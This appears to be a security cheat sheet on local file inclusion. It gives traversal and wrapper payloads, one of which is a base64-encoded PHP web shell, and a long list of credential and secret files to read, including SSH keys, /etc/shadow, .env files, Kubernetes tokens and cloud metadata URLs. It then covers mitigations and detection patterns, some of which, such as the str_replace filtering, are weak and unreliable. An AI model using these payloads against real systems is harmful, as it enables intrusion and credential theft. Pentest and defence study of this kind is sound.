# LFI Read Access Cheat Sheet

**Author:** Julien Bongars\
**Date:** 2025-10-13 01:00:27
**Path:**

---

## Useful Tools

- **wfuzz** - Web application bruteforcer
- **LFISuite** - Automated LFI exploitation
- **fimap** - File inclusion mapper
- **Kadimus** - LFI exploitation tool

---

## Reminder: Common LFI Bypass Techniques (for testing)

### Null Byte Injection (PHP < 5.3.4)

```
?file=../../../../etc/passwd%00
```

### Path Truncation

```
?file=../../../../etc/passwd................................................................
```

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
expect://whoami
```

### Double Encoding

```
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

---

## OS & Kernel Information

### System Details

```bash
/etc/os-release          # OS name, version, ID
/proc/version            # Kernel version and build info
/etc/issue               # System identification text
/etc/lsb-release         # Distribution-specific version info
```

### System Configuration

```bash
/etc/hostname            # System hostname
/etc/timezone            # System timezone
/etc/fstab               # Mounted filesystems
/proc/cmdline            # Kernel boot parameters
/proc/cpuinfo            # CPU information
/proc/meminfo            # Memory information
```

---

## Network Configuration

### Network Files

```bash
/etc/hosts               # Static hostname mappings
/etc/resolv.conf         # DNS resolver configuration
/etc/network/interfaces  # Network interface config (Debian/Ubuntu)
/etc/sysconfig/network-scripts/ifcfg-eth0  # RHEL/CentOS network config
/etc/netplan/*.yaml      # Netplan configuration (modern Ubuntu)
```

### Network Services

```bash
/etc/dnsmasq.conf        # DNS/DHCP service config
/etc/dhcpcd.conf         # DHCP client daemon config
/etc/netconfig           # Network configuration database
/proc/net/tcp            # Active TCP connections
/proc/net/udp            # Active UDP connections
/proc/net/fib_trie       # Routing table
/proc/net/arp            # ARP table
```

---

## Current Process Information

### Environment Variables

```bash
/proc/self/environ       # Environment variables of current process
/proc/self/cwd           # Current working directory (symlink)
/proc/self/exe           # Executable path (symlink)
/proc/self/fd/           # Open file descriptors
```

### Process Details

```bash
/proc/self/cmdline       # Command line arguments
/proc/self/status        # Process status (PID, UIDs, GIDs)
/proc/self/maps          # Memory mappings
/proc/self/limits        # Resource limits
/proc/self/mountinfo     # Mount information
```

### Specific PIDs

```bash
/proc/[PID]/environ      # Environment for specific process
/proc/[PID]/cmdline      # Command line for specific process
/proc/[PID]/cwd          # Working directory for specific process
```

---

## User & Authentication

### User Information

```bash
/etc/passwd              # User accounts (no passwords)
/etc/shadow              # Password hashes (requires root)
/etc/group               # Group definitions
/etc/sudoers             # Sudo configuration
/etc/sudoers.d/*         # Additional sudo configs
```

### User Files

```bash
/home/[user]/.ssh/id_rsa           # Private SSH key
/home/[user]/.ssh/id_rsa.pub       # Public SSH key
/home/[user]/.ssh/authorized_keys  # Authorized public keys
/home/[user]/.ssh/known_hosts      # SSH host fingerprints
/home/[user]/.bash_history         # Command history
/home/[user]/.bashrc               # Bash configuration
/home/[user]/.profile              # Shell profile
/root/.ssh/id_rsa                  # Root SSH private key
```

### Authentication Logs

```bash
/var/log/auth.log        # Authentication logs (Debian/Ubuntu)
/var/log/secure          # Authentication logs (RHEL/CentOS)
/var/log/wtmp            # Login records (binary)
/var/log/lastlog         # Last login times (binary)
```

---

## Web Application Files

### Apache

```bash
/etc/apache2/apache2.conf           # Main config
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/.htpasswd              # HTTP auth passwords
/var/log/apache2/access.log         # Access logs
/var/log/apache2/error.log          # Error logs
/usr/local/apache2/conf/httpd.conf  # Alternative path
```

### Nginx

```bash
/etc/nginx/nginx.conf               # Main config
/etc/nginx/sites-enabled/default    # Default site config
/var/log/nginx/access.log           # Access logs
/var/log/nginx/error.log            # Error logs
```

### PHP

```bash
/etc/php/*/apache2/php.ini          # PHP config (Apache)
/etc/php/*/fpm/php.ini              # PHP-FPM config
/var/log/php-fpm.log                # PHP-FPM logs
```

### Application Files

```bash
/var/www/html/config.php            # Common config file
/var/www/html/.env                  # Environment variables
/var/www/html/wp-config.php         # WordPress config
/var/www/html/.git/config           # Git repository config
/var/www/html/composer.json         # PHP dependencies
```

---

## Database Configuration

### MySQL/MariaDB

```bash
/etc/mysql/my.cnf                   # Main config
/etc/mysql/mysql.conf.d/mysqld.cnf  # Server config
/var/lib/mysql/mysql/user.MYD       # User table data
```

### PostgreSQL

```bash
/etc/postgresql/*/main/postgresql.conf  # Main config
/etc/postgresql/*/main/pg_hba.conf      # Authentication config
/var/lib/postgresql/.psql_history       # SQL history
```

### MongoDB

```bash
/etc/mongod.conf                    # MongoDB config
```

---

## System Logs

### General Logs

```bash
/var/log/syslog          # System log (Debian/Ubuntu)
/var/log/messages        # System log (RHEL/CentOS)
/var/log/dmesg           # Kernel ring buffer
/var/log/kern.log        # Kernel log
/var/log/boot.log        # Boot log
```

### Application Logs

```bash
/var/log/apache2/*       # Apache logs
/var/log/nginx/*         # Nginx logs
/var/log/mysql/*         # MySQL logs
/var/log/postgresql/*    # PostgreSQL logs
/var/log/mail.log        # Mail server logs
/var/log/cron.log        # Cron job logs
```

### Audit Logs

```bash
/var/log/audit/audit.log          # Auditd logs
/var/log/laurel/audit.log         # LAUREL formatted audit logs
```

---

## Service Configuration

### SSH

```bash
/etc/ssh/sshd_config     # SSH server config
/etc/ssh/ssh_config      # SSH client config
/root/.ssh/authorized_keys  # Root's authorized keys
```

### Cron

```bash
/etc/crontab             # System crontab
/etc/cron.d/*            # Cron jobs
/etc/cron.daily/*        # Daily cron scripts
/etc/cron.hourly/*       # Hourly cron scripts
/var/spool/cron/crontabs/*  # User crontabs
```

### Systemd

```bash
/etc/systemd/system/*    # System unit files
/lib/systemd/system/*    # Distribution unit files
/etc/systemd/system/*.service  # Service files
```

---

## Container & Virtualization

### Docker

```bash
/var/lib/docker/containers/*/config.v2.json  # Container configs
/.dockerenv                                   # Docker environment marker
```

### Kubernetes

```bash
/var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # K8s CA cert
```

### Cloud Metadata

```bash
http://169.254.169.254/latest/meta-data/     # AWS metadata (SSRF)
http://metadata.google.internal/             # GCP metadata (SSRF)
```

---

## Backup & Temporary Files

### Backups

```bash
/var/backups/*           # System backups
/root/backup.sql         # Common backup location
/tmp/backup.tar.gz       # Temporary backups
*.bak                    # Backup files
*.old                    # Old config files
*~                       # Editor backup files
```

### Temporary Files

```bash
/tmp/*                   # Temporary files
/var/tmp/*               # Persistent temporary files
/dev/shm/*               # Shared memory (RAM disk)
```

---

## Mail & Services

### Mail

```bash
/var/mail/*              # User mailboxes
/var/spool/mail/*        # Alternative mail location
```

### FTP

```bash
/etc/vsftpd.conf         # vsftpd config
/etc/proftpd/proftpd.conf  # ProFTPD config
```

---

## LFI Prevention & Mitigation

### Input Validation

```php
// BAD - Direct user input
include($_GET['page'] . '.php');

// GOOD - Whitelist approach
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}

// GOOD - basename() to prevent directory traversal
$file = basename($_GET['file']);
include('/var/www/pages/' . $file);
```

### Path Sanitization

```php
// Remove directory traversal sequences
$file = str_replace(['../', '..\\', '../\\'], '', $_GET['file']);

// Use realpath() to resolve absolute path
$basedir = '/var/www/html/';
$file = realpath($basedir . $_GET['file']);
if (strpos($file, $basedir) === 0) {
    include($file);
}
```

### PHP Configuration Hardening

```ini
; php.ini hardening
allow_url_fopen = Off          ; Disable remote file inclusion
allow_url_include = Off        ; Disable remote file inclusion
open_basedir = /var/www/html   ; Restrict file access to specific directory
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

### Web Server Configuration

**Apache (.htaccess)**

```apache
# Deny access to sensitive files
<FilesMatch "\.(log|ini|conf|bak|old)$">
    Require all denied
</FilesMatch>

# Prevent directory traversal
RewriteEngine On
RewriteCond %{QUERY_STRING} \.\.\/ [OR]
RewriteCond %{QUERY_STRING} \.\.\\ [OR]
RewriteCond %{QUERY_STRING} etc/passwd
RewriteRule .* - [F,L]
```

**Nginx**

```nginx
# Block access to sensitive files
location ~* \.(log|ini|conf|bak|old)$ {
    deny all;
}

# Block directory traversal attempts
if ($args ~* "\.\./") {
    return 403;
}
```

### Application-Level Protections

**File Access Control**

```php
// Use a mapping system instead of direct file inclusion
$pages = [
    'home' => '/var/www/pages/home.php',
    'about' => '/var/www/pages/about.php',
    'contact' => '/var/www/pages/contact.php'
];

$page = $_GET['page'] ?? 'home';
if (isset($pages[$page])) {
    include($pages[$page]);
} else {
    http_response_code(404);
    include('/var/www/pages/404.php');
}
```

**Read-Only File System**

```bash
# Mount application directory as read-only
mount -o remount,ro /var/www/html

# Use Docker with read-only root filesystem
docker run --read-only -v /tmp:/tmp myapp
```

### Monitoring & Detection

**Log Monitoring**

```bash
# Monitor for LFI patterns in logs
grep -E "(\.\.\/|etc/passwd|php://|file://)" /var/log/apache2/access.log

# Use fail2ban to block LFI attempts
# /etc/fail2ban/filter.d/lfi.conf
[Definition]
failregex = ^<HOST> .* "GET .*(\.\./|etc/passwd|php://|file://).*"
```

**WAF Rules**

```
# ModSecurity rules for LFI
SecRule ARGS "@rx (?:\.\./|etc/passwd|php://|file://)" \
    "id:1000,phase:2,block,log,msg:'LFI Attempt Detected'"
```

### Security Best Practices

1. **Never trust user input** - Always validate and sanitize
2. **Use whitelists** - Define allowed files explicitly
3. **Restrict file system access** - Use `open_basedir` and chroot
4. **Disable dangerous PHP functions** - Block `include()` on user input
5. **Monitor logs** - Set up alerts for suspicious patterns
6. **Regular security audits** - Test for LFI vulnerabilities
7. **Principle of least privilege** - Run web server with minimal permissions
8. **Keep software updated** - Patch known vulnerabilities

---

**Remember:** This cheat sheet is for authorized security testing and defense purposes only. Unauthorized access to systems is illegal.
